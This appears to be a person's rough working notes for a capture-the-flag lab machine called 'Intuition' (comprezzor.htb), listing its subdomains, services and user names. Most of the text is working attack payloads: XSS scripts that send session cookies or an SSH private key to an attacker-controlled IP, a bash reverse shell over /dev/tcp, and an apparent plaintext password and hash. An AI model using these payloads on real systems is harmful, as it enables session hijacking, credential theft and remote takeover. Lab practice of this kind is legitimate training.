# Intuition Notes

## Data

IP: 10.129.21.205 
OS: Ubuntu Jammy
Arch: x64
Hostname:
DNS: comprezzor.htb auth.comprezzor.htb report.comprezzor.htb dashboard.comprezzor.htb
Machine Purpose: Web server
Services: 22,80
Service Languages: nginx: ;
Users: 
- web:
	- admin
	- support
Email and Username Formatting:
Credentials:



#### Mindmap-per Service

- OS detect, run generate noting for `nmap`
- https://launchpad.net/ubuntu/+source/openssh/1:8.9p1-3ubuntu0.7 
- 



```html
<script>fetch("http://10.10.14.39:8445/"+document.cookie)</script>
```

```html
<script>fetch("http://10.10.14.39:8445/"+readFile("/home/adam/.ssh/id_rsa"))</script>
```

#### Todo List

admin cookie on:
auth is just to login
report is to report 
dashboard 
- 

```
echo '/bin/bash -i >& /dev/tcp/10.10.14.39/8443 0>&1' > /tmp/root.sh
```

Lopezz1992%123

0feda17076d793c2ef2870d7427ad4ed
#### Done


- not
	- https://ubuntu.com/security/CVE-2024-3094
	- https://www.rapid7.com/blog/post/2024/04/01/etr-backdoored-xz-utils-cve-2024-3094
	- https://www.akamai.com/blog/security-research/critical-linux-backdoor-xz-utils-discovered-what-to-know
	- https://www.logpoint.com/en/blog/emerging-threats/xz-utils-backdoor/
-
-
https://medium.com/@marduk.i.am/exploiting-cross-site-scripting-to-steal-cookies-3d14c8b42fae
```html
<img src=x onerror="this.src='http://10.10.14.29:8888/'+document.cookie; this.removeAttribute('onerror');">

<script><img src=x onerror="this.src='http://10.10.14.29:8888/'+document.cookie; this.removeAttribute('onerror');"></script>

<!-- https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies -->
<script> fetch('http://10.10.14.29:8888', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>

<script>fetch('http://10.10.14.29');</script>

<script>fetch('http://10.10.14.29')</script>

<script>new Image().src="http://$attacker-ip:port/cookiejar.jpg?output="+document.cookie;</script>
```

https://gist.github.com/YasserGersy/a0fee5ce7422a558c84bfd7790d8a082 - javascript mutli lines payload into one line
https://medium.com/@yassergersy/xss-to-session-hijack-6039e11e6a81
